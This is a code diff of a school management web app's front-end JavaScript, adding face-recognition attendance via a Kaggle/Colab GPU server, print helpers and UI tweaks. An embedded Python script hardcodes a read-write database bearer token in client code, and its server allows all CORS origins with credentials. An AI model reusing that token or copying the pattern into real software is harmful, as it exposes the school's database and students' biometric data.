-      <div class="canvas-container" style="position: relative; height: 250px; width: 100%;"><canvas id="classChart"></canvas></div>
+      <div class="canvas-container" style="position: relative; flex: 1 1 0%; min-height: 280px; height: 100%; width: 100%;"><canvas id="classChart"></canvas></div>
     </div>
-    <div class="chart-card">
+    <div class="chart-card" style="display: flex; flex-direction: column;">
       <h3 class="chart-title">Attendance Insights <span class="chart-badge"><div class="dot"></div> Live</span></h3>
-      <div class="canvas-container" style="position: relative; height: 250px; width: 100%;"><canvas id="attChart"></canvas></div>
+      <div class="canvas-container" style="position: relative; flex: 1 1 0%; min-height: 280px; height: 100%; width: 100%;"><canvas id="attChart"></canvas></div>
     </div>`;
 
   chartsHtml += window.renderDashboardCalendarHTML();
@@ -4767,7 +5136,7 @@ function renderStatsCards(forceFullRebuild = false) {
         type: "bar",
         data: {
           labels: Object.keys(classDist),
-          datasets: [{ label: 'Students', data: Object.values(classDist), backgroundColor: "#4f46e5", borderRadius: 8, barThickness: 12 }]
+          datasets: [{ label: 'Students', data: Object.values(classDist), backgroundColor: "#4f46e5", borderRadius: 8, maxBarThickness: 18, categoryPercentage: 0.75, barPercentage: 0.75 }]
         },
         options: { 
           responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } },
@@ -4959,10 +5328,12 @@ function renderModuleTools() {
   }
   if (refs.print4in1Btn) refs.print4in1Btn.classList.toggle("hidden", currentModule !== "fees");
   if (refs.appReleasesBtn) refs.appReleasesBtn.classList.toggle("hidden", currentModule !== "appLiveUsers");
+  if (refs.liveOtaStreamBtn) refs.liveOtaStreamBtn.classList.toggle("hidden", currentModule !== "appLiveUsers");
 
-  // Face panel only for users who can write attendance or manage people
+  // Face panel only for users who can write attendance or manage people (and when faceAttendance is enabled by Super Admin)
   const showFacePanel = (currentModule === "attendance" || currentModule === "teacherAttendance" || currentModule === "students" || currentModule === "teachers")
-    && (userIsAdmin() || userIsStaffOrAbove() || String(currentUser?.role || "").toLowerCase() === "teacher");
+    && (userIsAdmin() || userIsStaffOrAbove() || String(currentUser?.role || "").toLowerCase() === "teacher")
+    && (typeof window.isSaasModuleEnabled !== "function" || window.isSaasModuleEnabled("faceAttendance"));
   refs.facePanel.classList.toggle("hidden", !showFacePanel);
 
   if (!showFacePanel) return;
@@ -5230,8 +5601,14 @@ window.setStudentPortalTab = function(tab) {
 };
 
 function renderStudentPortalHolidays() {
+  if (typeof window.ensureLiveHolidaysLoaded === "function") {
+    window.ensureLiveHolidaysLoaded(new Date().getFullYear());
+  }
   const store = getStore();
-  const holidays = store.holidays || [];
+  const curYear = String(new Date().getFullYear());
+  const allHolidays = store.holidays || [];
+  const yearFiltered = allHolidays.filter(h => String(h.date || "").startsWith(curYear));
+  const holidays = yearFiltered.length > 0 ? yearFiltered : allHolidays;
   
   if (!holidays.length) {
     refs.studentProfileContent.innerHTML = `
@@ -5899,7 +6276,7 @@ function toCsv(rows, columns) {
 let _calYear  = new Date().getFullYear();
 let _calMonth = new Date().getMonth();
 
-function renderCalendar() {
+function renderCalendar(skipAutoFetch = false) {
   const grid  = document.getElementById("schoolCalendar");
   const label = document.getElementById("calMonthLabel");
   const prev  = document.getElementById("calPrev");
@@ -5912,10 +6289,19 @@ function renderCalendar() {
     next.addEventListener("click", () => { _calMonth++; if (_calMonth > 11) { _calMonth = 0; _calYear++; } renderCalendar(); });
   }
 
+  if (!skipAutoFetch && typeof window.ensureLiveHolidaysLoaded === "function") {
+    setTimeout(() => window.ensureLiveHolidaysLoaded(_calYear), 10);
+  }
+
   const store = getStore();
   const holidays = store.holidays || [];
   const holidayMap = {};
-  holidays.forEach(h => { if (h.date) holidayMap[h.date] = h.name || "Holiday"; });
+  holidays.forEach(h => {
+    if (h.date) {
+      const nm = h.name || "Holiday";
+      holidayMap[h.date] = holidayMap[h.date] ? `${holidayMap[h.date]} • ${nm}` : nm;
+    }
+  });
 
   const today = new Date();
   const MONTHS = ["January","February","March","April","May","June","July","August","September","October","November","December"];
@@ -6338,11 +6724,7 @@ function printFeeReceipt(f) {
     </div>`;
 
   const receiptHtml = buildPrintableHtml("Fee Receipt - " + schoolName, html);
-  const w = window.open("", "_blank");
-  if (!w) return window.alert("Popup blocked. Please allow popups for this site and try again.");
-  w.document.write(receiptHtml);
-  w.document.close();
-  w.focus();
+  openPrintWindowOrFallback(receiptHtml, "Fee Receipt - " + schoolName, { autoPrint: true });
 }
 
 function buildPrintableHtml(title, contentHtml) {
@@ -6421,12 +6803,7 @@ function printDocumentByModule() {
   // ── Students → Premium ID Cards ──────────────────────────────────────────
   if (currentModule === "students") {
     const fullHtml = generateIdCardsHTML(store);
-    const w = window.open("", "_blank");
-    if (!w) return window.alert("Popup blocked. Please allow popups for this site and try again.");
-    w.document.open();
-    w.document.write(fullHtml);
-    w.document.close();
-    w.focus();
+    openPrintWindowOrFallback(fullHtml, "Tapowan Public School — Student ID Cards Studio", { isInteractiveStudio: true });
     return;
   }
 
@@ -6514,11 +6891,7 @@ function printDocumentByModule() {
     }).join("");
   }
 
-  const w = window.open("", "_blank");
-  if (!w) return window.alert("Popup blocked. Please allow popups for this site and try again.");
-  w.document.write(buildPrintableHtml(moduleConfig[currentModule].title, html));
-  w.document.close();
-  w.focus();
+  openPrintWindowOrFallback(buildPrintableHtml(moduleConfig[currentModule].title, html), moduleConfig[currentModule].title, { autoPrint: true });
 }
 
 
@@ -6548,34 +6921,40 @@ async function fetchDirectFromTurso(sql, args = []) {
   }
 }
 
-// --- Pure InsightFace ArcFace 512-D GPU Integration (Colab & Cloud) ---
-let insightFaceApiUrl = localStorage.getItem('tps_insightface_api_url') || 'https://trans-choir-spotlight-sponsored.trycloudflare.com';
+// --- Pure InsightFace ArcFace 512-D GPU Integration (Kaggle & Colab) ---
+let insightFaceApiUrl = localStorage.getItem('tps_insightface_api_url') || '';
 let insightFaceMode = 'server';
 
 async function ensureFaceModelsLoaded() {
-  if (refs.faceStatusText) refs.faceStatusText.textContent = "Connecting to InsightFace GPU AI Engine...";
+  if (refs.faceStatusText) refs.faceStatusText.textContent = "Connecting to InsightFace GPU AI Engine (Kaggle / Colab)...";
   
-  // 1. Check Turso DB for live Google Colab / Cloud GPU URL
-  let dbUrl = '';
+  // 1. Check Turso DB for live Kaggle / Colab GPU URL
+  let dbUrls = [];
   try {
-    const dynamicSetting = await fetchDirectFromTurso("SELECT value FROM settings WHERE key = 'colab_insightface_url' LIMIT 1;");
-    if (dynamicSetting && dynamicSetting[0]?.value && dynamicSetting[0].value.startsWith('http')) {
-      dbUrl = dynamicSetting[0].value.trim();
+    const dynamicSettings = await fetchDirectFromTurso("SELECT key, value FROM settings WHERE key IN ('kaggle_insightface_url', 'colab_insightface_url') ORDER BY id DESC;");
+    if (dynamicSettings && Array.isArray(dynamicSettings)) {
+      dynamicSettings.forEach(s => {
+        if (s?.value && typeof s.value === 'string' && s.value.startsWith('http')) {
+          dbUrls.push(s.value.trim());
+        }
+      });
     }
   } catch(e) {}
 
   const candidates = [
-    dbUrl,
+    ...dbUrls,
     localStorage.getItem('tps_insightface_api_url'),
-    'https://trans-choir-spotlight-sponsored.trycloudflare.com',
-    'https://groundwater-vocational-brook-cornwall.trycloudflare.com'
+    localStorage.getItem('tps_kaggle_api_url')
   ].filter(u => u && typeof u === 'string' && u.startsWith('http'));
 
-  for (const candidate of candidates) {
+  const uniqueCandidates = [...new Set(candidates)];
+
+  for (const candidate of uniqueCandidates) {
     try {
       const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 4000);
+      const timeoutId = setTimeout(() => controller.abort(), 3500);
       let res = await fetch(`${candidate}/health`, { signal: controller.signal });
+      if (!res.ok) res = await fetch(`${candidate}/status`, { signal: controller.signal });
       if (!res.ok) res = await fetch(`${candidate}/`, { signal: controller.signal });
       clearTimeout(timeoutId);
       
@@ -6586,6 +6965,7 @@ async function ensureFaceModelsLoaded() {
         faceModelsReady = true;
         if (refs.faceStatusText) refs.faceStatusText.textContent = "🚀 Connected to InsightFace 512-D GPU Server!";
         updateColabStatusBadge(true, candidate);
+        closeGpuServerModal(); // Auto-close transparent modal screen on connect
         
         syncFaceEmbeddingsFromServer().then(() => {
           const fs = getFaceStore();
@@ -6597,14 +6977,14 @@ async function ensureFaceModelsLoaded() {
         return true;
       }
     } catch(err) {
-      console.warn("Colab server probe failed for:", candidate, err.message);
+      console.warn("GPU server probe failed for:", candidate, err.message);
     }
   }
 
-  // If offline, prompt user to connect Google Colab
+  // If offline, prompt user to connect Kaggle / Colab GPU
   updateColabStatusBadge(false);
   if (refs.faceStatusText) {
-    refs.faceStatusText.textContent = "⚠️ InsightFace GPU Server Offline. Click badge to enter Google Colab URL.";
+    refs.faceStatusText.textContent = "⚠️ InsightFace GPU Server Offline. Click 'Connect Kaggle' badge to start free GPU.";
   }
   faceModelsReady = false;
   return false;
@@ -6613,12 +6993,12 @@ async function ensureFaceModelsLoaded() {
 function updateColabStatusBadge(online, url = '') {
   let badge = document.getElementById('colabGpuBadge');
   if (!badge) {
-    const container = document.querySelector('.face-controls') || document.querySelector('.camera-card') || document.querySelector('.attendance-panel');
+    const container = document.querySelector('#facePanel .panel-actions') || document.querySelector('.panel-actions') || document.querySelector('#facePanel');
     if (container) {
       badge = document.createElement('div');
       badge.id = 'colabGpuBadge';
-      badge.style.cssText = 'display:inline-flex; align-items:center; gap:6px; font-size:0.8rem; font-weight:600; padding:4px 10px; border-radius:20px; margin:6px 0; cursor:pointer; transition:all 0.2s;';
-      container.insertBefore(badge, container.firstChild);
+      badge.style.cssText = 'display:inline-flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:600; padding:4px 12px; border-radius:20px; margin-left:6px; cursor:pointer; transition:all 0.2s;';
+      container.appendChild(badge);
     }
   }
   if (!badge) return;
@@ -6627,27 +7007,243 @@ function updateColabStatusBadge(online, url = '') {
     badge.style.background = 'rgba(16, 185, 129, 0.15)';
     badge.style.color = '#10b981';
     badge.style.border = '1px solid rgba(16, 185, 129, 0.3)';
-    badge.innerHTML = `🟢 <span>InsightFace GPU Online</span> <small style="opacity:0.7; font-size:0.7rem; margin-left:4px;">(512-D ArcFace)</small>`;
+    badge.innerHTML = `🟢 <span>GPU AI Online</span> <small style="opacity:0.8; font-size:0.72rem; margin-left:4px;">(Kaggle 512-D)</small>`;
   } else {
     badge.style.background = 'rgba(239, 68, 68, 0.15)';
     badge.style.color = '#ef4444';
     badge.style.border = '1px solid rgba(239, 68, 68, 0.3)';
-    badge.innerHTML = `🔴 <span>Colab GPU Offline</span> <small style="text-decoration:underline; margin-left:4px; font-size:0.7rem;">Click to Enter Link</small>`;
+    badge.innerHTML = `🔴 <span>GPU AI Offline</span> <small style="text-decoration:underline; margin-left:4px; font-size:0.75rem;">Connect Kaggle</small>`;
   }
 
-  badge.onclick = () => {
-    const current = localStorage.getItem('tps_insightface_api_url') || '';
-    const newUrl = window.prompt("Enter your live Google Colab Cloudflare URL (e.g. https://xxxx.trycloudflare.com):", current);
-    if (newUrl !== null) {
-      const clean = newUrl.trim();
-      if (clean) {
-        localStorage.setItem('tps_insightface_api_url', clean);
-        insightFaceApiUrl = clean;
-        faceModelsReady = false;
-        ensureFaceModelsLoaded();
-      }
+  badge.onclick = () => openGpuServerModal();
+}
+
+// Kaggle Server Python Script for 1-Click Clipboard Copy
+const KAGGLE_GPU_PYTHON_CODE = `# -*- coding: utf-8 -*-
+# Tapowan Public School - InsightFace ArcFace 512-D GPU Server (Kaggle)
+# Free NVIDIA Tesla T4 GPU (30 Hours/Week) with Auto-Turso Sync
+
+import os, sys, subprocess, time, re, urllib.request, requests
+
+TURSO_URL = 'https://tapowan-v2-tapowan.aws-ap-south-1.turso.io/v2/pipeline'
+TURSO_TOKEN = 'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJhIjoicnciLCJpYXQiOjE3ODkwOTIyMTUsImlkIjoiMDFhMDhlMzQtODMwMS03MDI0LTk5ZWQtMGQ0MmYwMGJiNjFlIiwia2lkIjoiVFRPdk5ISlFYZVAtX1FsNG9ZUXM4cTBTYXRiZzJ1UmVhYjlUbjFyem1tcyIsInJpZCI6ImVjNjc2YzExLTRhNGUtNGZhNi1hMTM1LTJmZDk4YTIxNzliMSJ9.RmzczPOvgV3Hd83byF7fMfQsCzlJnF8r9MCGtzTfZDj8k--VqtItniZN5GCiPfv4-dCEmDZaIWDGPOnM-EknDA'
+
+def log(m): print(m, flush=True)
+
+def update_turso(url):
+    log(f"🔄 Syncing URL to Turso DB: {url}")
+    payload = {
+        "requests": [
+            {"type": "execute", "stmt": {"sql": "DELETE FROM settings WHERE key IN ('colab_insightface_url', 'kaggle_insightface_url');"}},
+            {"type": "execute", "stmt": {"sql": "INSERT INTO settings (key, value, category) VALUES ('colab_insightface_url', ?, 'AI');", "args": [{"type": "text", "value": url}]}},
+            {"type": "execute", "stmt": {"sql": "INSERT INTO settings (key, value, category) VALUES ('kaggle_insightface_url', ?, 'AI');", "args": [{"type": "text", "value": url}]}},
+            {"type": "close"}
+        ]
     }
-  };
+    try:
+        r = requests.post(TURSO_URL, json=payload, headers={"Authorization": f"Bearer {TURSO_TOKEN}", "Content-Type": "application/json"}, timeout=15)
+        if r.ok: log("🎉 SUCCESS! Web Attendance portal has automatically connected to this GPU server!")
+    except Exception as e: log(f"Error updating Turso: {e}")
+
+log("📦 [1/4] Installing InsightFace, ONNX GPU & FastAPI...")
+subprocess.run([sys.executable, "-m", "pip", "install", "-q", "fastapi", "uvicorn", "insightface", "onnxruntime-gpu", "opencv-python-headless", "pillow", "requests", "python-multipart"], check=False)
+
+log("🌐 [2/4] Downloading Cloudflare Tunnel...")
+if not os.path.exists("cloudflared"):
+    urllib.request.urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared")
+    os.chmod("cloudflared", 0o777)
+
+log("⚡ [3/4] Preparing FastAPI AI Engine...")
+with open("app.py", "w", encoding="utf-8") as f:
+    f.write('''# -*- coding: utf-8 -*-
+import os, numpy as np, cv2
+from fastapi import FastAPI, File, UploadFile
+from fastapi.middleware.cors import CORSMiddleware
+from insightface.app import FaceAnalysis
+
+app = FastAPI()
+app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
+
+print("Loading InsightFace buffalo_l on Nvidia GPU...", flush=True)
+face_app = FaceAnalysis(name='buffalo_l', providers=['CUDAExecutionProvider', 'CPUExecutionProvider'])
+face_app.prepare(ctx_id=0, det_size=(640, 640))
+print("Ready on GPU!", flush=True)
+
+@app.get("/")
+@app.get("/health")
+@app.get("/status")
+def status(): return {"status": "ok", "engine": "Kaggle GPU 512-D ArcFace"}
+
+@app.post("/extract")
+async def extract(file: UploadFile = File(...)):
+    contents = await file.read()
+    nparr = np.frombuffer(contents, np.uint8)
+    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+    if img is None: return {"faces": []}
+    faces = face_app.get(img)
+    out = []
+    for f in faces:
+        x, y, x2, y2 = f.bbox.astype(int)
+        emb = f.embedding
+        norm = np.linalg.norm(emb)
+        if norm > 0: emb = emb / norm
+        out.append({"box": [int(x), int(y), int(max(1, x2-x)), int(max(1, y2-y))], "score": float(f.det_score) if hasattr(f, 'det_score') else 0.95, "embedding": emb.tolist()})
+    return {"faces": out}
+
+@app.post("/log_attendance")
+async def log_attendance(): return {"status": "ok"}
+''')
+
+log("🚀 [4/4] Starting Server & Cloudflare Tunnel...")
+subprocess.Popen([sys.executable, "-m", "uvicorn", "app:app", "--host", "0.0.0.0", "--port", "8000"])
+tunnel_proc = subprocess.Popen(["./cloudflared", "tunnel", "--url", "http://127.0.0.1:8000", "--no-autoupdate"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+
+start_time = time.time()
+while time.time() - start_time < 90:
+    line = tunnel_proc.stdout.readline()
+    if not line: time.sleep(0.5); continue
+    match = re.search(r'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com', line)
+    if match:
+        url = match.group(0)
+        log("\\n" + "="*65)
+        log(f"🎉 LIVE KAGGLE GPU URL: {url}")
+        log("="*65 + "\\n")
+        update_turso(url)
+        break
+
+log("🚀 Server is live! Keep this notebook open while running attendance.")
+while True: time.sleep(60)
+`;
+
+function openGpuServerModal() {
+  const modal = document.getElementById('gpuServerModal');
+  if (!modal) return;
+  modal.classList.remove('hidden');
+  modal.style.display = 'flex';
+
+  const currentUrl = localStorage.getItem('tps_insightface_api_url') || insightFaceApiUrl || '';
+  const input = document.getElementById('gpuServerUrlInput');
+  if (input) input.value = currentUrl;
+
+  const urlDisplay = document.getElementById('gpuModalCurrentUrl');
+  if (urlDisplay) urlDisplay.textContent = currentUrl ? currentUrl : 'None connected';
+
+  const banner = document.getElementById('gpuModalStatusBanner');
+  const dot = document.getElementById('gpuModalStatusDot');
+  const text = document.getElementById('gpuModalStatusText');
+
+  if (faceModelsReady && currentUrl) {
+    if (banner) {
+      banner.style.background = 'rgba(16, 185, 129, 0.12)';
+      banner.style.borderColor = 'rgba(16, 185, 129, 0.3)';
+      banner.style.color = '#10b981';
+    }
+    if (dot) dot.textContent = '🟢';
+    if (text) text.textContent = 'InsightFace GPU Connected';
+  } else {
+    if (banner) {
+      banner.style.background = 'rgba(239, 68, 68, 0.12)';
+      banner.style.borderColor = 'rgba(239, 68, 68, 0.3)';
+      banner.style.color = '#ef4444';
+    }
+    if (dot) dot.textContent = '🔴';
+    if (text) text.textContent = 'Server Offline';
+  }
+}
+
+function closeGpuServerModal() {
+  const modal = document.getElementById('gpuServerModal');
+  if (modal) {
+    modal.classList.add('hidden');
+    modal.style.display = 'none';
+  }
+}
+
+function setupGpuServerModalEvents() {
+  const closeBtn = document.getElementById('closeGpuServerModalBtn');
+  if (closeBtn) closeBtn.onclick = closeGpuServerModal;
+
+  const modalEl = document.getElementById('gpuServerModal');
+  if (modalEl) {
+    modalEl.onclick = (e) => {
+      if (e.target === modalEl) closeGpuServerModal();
+    };
+  }
+
+  const saveBtn = document.getElementById('gpuServerSaveBtn');
+  if (saveBtn) {
+    saveBtn.onclick = async () => {
+      const input = document.getElementById('gpuServerUrlInput');
+      const val = input ? input.value.trim() : '';
+      if (val && val.startsWith('http')) {
+        localStorage.setItem('tps_insightface_api_url', val);
+        insightFaceApiUrl = val;
+        faceModelsReady = false;
+        closeGpuServerModal();
+        if (typeof showToast === 'function') showToast("Connecting to GPU Server: " + val, "info");
+        await ensureFaceModelsLoaded();
+      } else {
+        alert("Please enter a valid HTTP/HTTPS URL (e.g. https://xxxx.trycloudflare.com)");
+      }
+    };
+  }
+
+  const tabKaggle = document.getElementById('tabKaggleBtn');
+  const tabColab = document.getElementById('tabColabBtn');
+  const kaggleGuide = document.getElementById('kaggleGuideContainer');
+  const colabGuide = document.getElementById('colabGuideContainer');
+
+  if (tabKaggle && tabColab) {
+    tabKaggle.onclick = () => {
+      tabKaggle.style.background = '#0284c7';
+      tabKaggle.style.color = '#fff';
+      tabColab.style.background = '#334155';
+      tabColab.style.color = '#94a3b8';
+      if (kaggleGuide) kaggleGuide.style.display = 'block';
+      if (colabGuide) colabGuide.style.display = 'none';
+    };
+    tabColab.onclick = () => {
+      tabColab.style.background = '#d97706';
+      tabColab.style.color = '#fff';
+      tabKaggle.style.background = '#334155';
+      tabKaggle.style.color = '#94a3b8';
+      if (kaggleGuide) kaggleGuide.style.display = 'none';
+      if (colabGuide) colabGuide.style.display = 'block';
+    };
+  }
+
+  const copyKaggle = document.getElementById('copyKaggleCodeBtn');
+  if (copyKaggle) {
+    copyKaggle.onclick = () => {
+      navigator.clipboard.writeText(KAGGLE_GPU_PYTHON_CODE).then(() => {
+        if (typeof showToast === 'function') {
+          showToast("📋 Kaggle Python code copied! Paste in Kaggle notebook and run.", "success");
+        } else {
+          alert("Kaggle Python code copied to clipboard!");
+        }
+      });
+    };
+  }
+
+  const copyColab = document.getElementById('copyColabCodeBtn');
+  if (copyColab) {
+    copyColab.onclick = () => {
+      navigator.clipboard.writeText(KAGGLE_GPU_PYTHON_CODE).then(() => {
+        if (typeof showToast === 'function') {
+          showToast("📋 Colab Python code copied! Paste in Google Colab and run.", "success");
+        } else {
+          alert("Colab Python code copied to clipboard!");
+        }
+      });
+    };
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  setupGpuServerModalEvents();
+});
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  setupGpuServerModalEvents();
 }
 
 function getVisualCrop(vw, vh) {
@@ -6761,20 +7357,68 @@ let ipCamDetectTimer = null; // throttled detection for IP cam
 let ipCamLastDetections = []; // cached detection results
 let ipCamDetecting = false;  // guard against concurrent detections
 
-// Toggle IP camera URL input when camera source changes
+// Toggle IP camera URL input and local camera device selector when camera source changes
+async function populateCameraDevices() {
+  if (!navigator.mediaDevices?.enumerateDevices) return;
+  try {
+    const devSelect = document.getElementById('localCameraDeviceSelect');
+    if (!devSelect) return;
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoInputs = devices.filter(d => d.kind === 'videoinput');
+    if (!videoInputs.length) return;
+
+    const savedDeviceId = localStorage.getItem('tps_preferred_camera_id') || '';
+    devSelect.innerHTML = '';
+
+    videoInputs.forEach((dev, idx) => {
+      const opt = document.createElement('option');
+      opt.value = dev.deviceId;
+      const label = dev.label || `Camera ${idx + 1}`;
+      opt.textContent = label.toLowerCase().includes('obs') ? `🎥 ${label}` : label;
+      devSelect.appendChild(opt);
+    });
+
+    const obsOpt = Array.from(devSelect.options).find(o => o.text.toLowerCase().includes('obs'));
+    if (savedDeviceId && Array.from(devSelect.options).some(o => o.value === savedDeviceId)) {
+      devSelect.value = savedDeviceId;
+    } else if (obsOpt) {
+      devSelect.value = obsOpt.value;
+    }
+
+    const isLocal = (refs.cameraSourceSelect?.value || 'local') === 'local';
+    devSelect.style.display = isLocal ? 'inline-block' : 'none';
+  } catch (_) {}
+}
+
+const _devSelectElem = document.getElementById('localCameraDeviceSelect');
+if (_devSelectElem) {
+  _devSelectElem.addEventListener('change', () => {
+    localStorage.setItem('tps_preferred_camera_id', _devSelectElem.value);
+    if (!ipCamMode && faceStream) {
+      startCamera();
+    }
+  });
+}
+
 if (refs.cameraSourceSelect) {
   refs.cameraSourceSelect.addEventListener('change', () => {
     const val = refs.cameraSourceSelect.value;
     const isIp = val === 'ip';
     const isMulti = val === 'multi';
+    const devSelect = document.getElementById('localCameraDeviceSelect');
+    if (devSelect) devSelect.style.display = (!isIp && !isMulti) ? 'inline-block' : 'none';
     if (refs.ipCameraControls) refs.ipCameraControls.style.display = isIp ? 'flex' : 'none';
     const multiWrap = document.getElementById('multiCamWrapper');
     if (multiWrap) multiWrap.style.display = isMulti ? 'block' : 'none';
     if (refs.localCamWrapper) refs.localCamWrapper.style.display = isMulti ? 'none' : (isIp ? 'none' : 'block');
     if (refs.ipCamWrapper) refs.ipCamWrapper.style.display = isIp ? 'block' : 'none';
     if (isMulti) initMultiCamUI();
+    if (!isIp && !isMulti) populateCameraDevices();
   });
 }
+
+// Initial populate of camera devices
+setTimeout(populateCameraDevices, 1000);
 
 async function startCamera() {
   const source = refs.cameraSourceSelect?.value || 'local';
@@ -6839,12 +7483,26 @@ async function startCamera() {
       return;
     }
     try {
+      const devSelect = document.getElementById('localCameraDeviceSelect');
+      const selectedId = devSelect?.value;
+      const videoConstraints = {
+        width: { ideal: 1920 },
+        height: { ideal: 1080 }
+      };
+      if (selectedId) {
+        videoConstraints.deviceId = { exact: selectedId };
+      } else {
+        videoConstraints.facingMode = 'user';
+      }
+
       faceStream = await navigator.mediaDevices.getUserMedia({
-        video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: 'user' },
+        video: videoConstraints,
         audio: false
       });
       refs.faceVideo.srcObject = faceStream;
+      closeGpuServerModal(); // Auto-close transparent modal screen on camera connect!
       refs.faceStatusText.textContent = 'Camera started. Loading AI models…';
+      populateCameraDevices(); // Refresh labels once browser grants camera permission!
       ensureFaceModelsLoaded().then(() => {
         refs.faceStatusText.textContent = '✅ Ready — AI models loaded.';
         startBBoxOverlay();
@@ -9014,11 +9672,7 @@ async function executePrint4in1() {
     </script>
   </body></html>`;
 
-  const w = window.open("", "_blank");
-  if (!w) return window.alert("Popup blocked.");
-  w.document.open();
-  w.document.write(html);
-  w.document.close();
+  openPrintWindowOrFallback(html, "4-in-1 Receipts", { autoPrint: true });
   closePrint4in1Modal();
 }
 
@@ -9068,11 +9722,7 @@ async function executePrint4in1Slip() {
     </script>
   </body></html>`;
 
-  const w = window.open("", "_blank");
-  if (!w) return window.alert("Popup blocked.");
-  w.document.open();
-  w.document.write(html);
-  w.document.close();
+  openPrintWindowOrFallback(html, "4-in-1 Slips", { autoPrint: true });
   closePrint4in1Modal();
 }
 
@@ -9516,6 +10166,24 @@ refs.mobileMenuBtn?.addEventListener("click", () => {
   setMobileSidebarOpen(opening);
 });
 
+refs.sidebarToggleBtn?.addEventListener("click", toggleSidebarCollapse);
+refs.topbarSidebarToggleBtn?.addEventListener("click", toggleSidebarCollapse);
+document.getElementById("sidebarToggleBtn")?.addEventListener("click", toggleSidebarCollapse);
+document.getElementById("topbarSidebarToggleBtn")?.addEventListener("click", toggleSidebarCollapse);
+
+// Keyboard shortcut: Ctrl+B or Cmd+B to toggle sidebar collapse
+window.addEventListener("keydown", (e) => {
+  if ((e.ctrlKey || e.metaKey) && (e.key === "b" || e.key === "B")) {
+    const tag = (e.target && e.target.tagName) || "";
+    if (tag === "INPUT" || tag === "TEXTAREA" || tag === "SELECT") return;
+    e.preventDefault();
+    toggleSidebarCollapse();
+  }
+});
+
+// Restore saved sidebar collapse state
+initSidebarCollapseState();
+
 refs.mobileSidebarBackdrop?.addEventListener("click", () => {
   setMobileSidebarOpen(false);
 });
@@ -9880,7 +10548,7 @@ const MODULE_ICONS = {
   exams: 'quiz', fees: 'account_balance_wallet', library: 'library_books', transport: 'directions_bus',
   hostel: 'apartment', payroll: 'payments', users: 'manage_accounts', timetable: 'calendar_month',
   booksAndDress: 'account_tree', bookSales: 'shopping_bag', whatsappAlerts: 'forum', dueManagement: 'receipt_long', holidays: 'event', backup: 'cloud_download', reportsAnalytics: 'insights',
-  weeklyEvaluation: 'grade'
+  weeklyEvaluation: 'grade', financeModule: 'account_balance'
 };
 
 if (refs.assistantOutput) {
@@ -10046,15 +10714,17 @@ function renderNavEnhanced() {
     currentModule = 'dashboard';
   }
 
-  // To prevent icon animation glitches, don't clear innerHTML if it's already built
-    let expectedButtonCount = 0;
+  // Rebuild sidebar whenever the visible module signature changes
+  const visibleSig = Array.from(visible).join(',');
+  let expectedButtonCount = 0;
   for (const [groupName, modules] of Object.entries(NAV_GROUPS)) {
     const visibleInGroup = modules.filter(mod => moduleConfig[mod] && visible.has(mod));
     expectedButtonCount += visibleInGroup.length;
   }
   const actualCoreButtons = Array.from(nav.querySelectorAll('button[data-module]')).filter(b => b.dataset.module !== 'financeModule');
 
-  if (actualCoreButtons.length !== expectedButtonCount) {
+  if (actualCoreButtons.length !== expectedButtonCount || nav.dataset.visibleSig !== visibleSig) {
+    nav.dataset.visibleSig = visibleSig;
     nav.innerHTML = '';
     for (const [groupName, modules] of Object.entries(NAV_GROUPS)) {
       const visibleInGroup = modules.filter(mod => moduleConfig[mod] && visible.has(mod));
@@ -10069,7 +10739,9 @@ function renderNavEnhanced() {
         const btn = document.createElement('button');
         btn.dataset.module = mod;
         btn.className = mod === currentModule ? 'active' : '';
-        btn.setAttribute('aria-current', mod === currentModule ? 'page' : 'false');
+        const titleText = (moduleConfig[mod] && moduleConfig[mod].title) || mod;
+        btn.setAttribute('title', titleText);
+        btn.setAttribute('data-tooltip', titleText);
         
         let badge = '';
         const store = getStore();
@@ -10100,6 +10772,9 @@ function renderNavEnhanced() {
       const mod = btn.dataset.module;
       btn.className = mod === currentModule ? 'active' : '';
       btn.setAttribute('aria-current', mod === currentModule ? 'page' : 'false');
+      const titleText = (moduleConfig[mod] && moduleConfig[mod].title) || mod;
+      btn.setAttribute('title', titleText);
+      btn.setAttribute('data-tooltip', titleText);
       
       let badge = '';
       const store = getStore();
@@ -11156,14 +11831,8 @@ function patchApp() {
     window.printDocumentByModule = function() {
       if (currentModule === 'students') {
         const store = getStore();
-        // generateIdCardsHTML now returns a full HTML document
         const fullHtml = generateIdCardsHTML(store);
-        const w = window.open('', '_blank');
-        if (!w) return window.alert('Popup blocked. Please allow popups.');
-        w.document.open();
-        w.document.write(fullHtml);
-        w.document.close();
-        showToast('🖨 Opening ID cards for print…', 'info');
+        openPrintWindowOrFallback(fullHtml, "Tapowan Public School — Student ID Cards Studio", { isInteractiveStudio: true });
       } else {
         _origPrint();
       }
@@ -11252,12 +11921,6 @@ function patchApp() {
 
 // Also patch startCamera to show toast
 const _rawStartCamera = typeof startCamera === 'function' ? startCamera : null;
-// patchApp() is already called via DOMContentLoaded above — only show the welcome toast here
-window.addEventListener('load', () => {
-  setTimeout(() => {
-    showToast('Welcome to EduCore 🏫', 'info', 2500);
-  }, 600);
-});
 
 // ================================================================
 // AI FACE RECOGNITION ENGINE v2 — EduCore Enhanced
@@ -11991,17 +12654,14 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
     return "₹" + v;
   }
   function isAdmin() {
-    // Use the global currentUser set by auth, not fragile badge-text parsing
+    if (typeof userIsAdmin === "function" && userIsAdmin()) return true;
     if (typeof currentUser !== "undefined" && currentUser) {
-      const role = String(currentUser.role || "").toLowerCase();
-      return role === "administrator" || role === "principal";
+      const r = String(currentUser.role || "").toLowerCase().trim().replace(/[\s-]+/g, "_");
+      return r === "administrator" || r === "school_admin" || r === "schooladmin" || r === "admin" || r === "super_admin" || r === "superadmin" || r === "principal";
     }
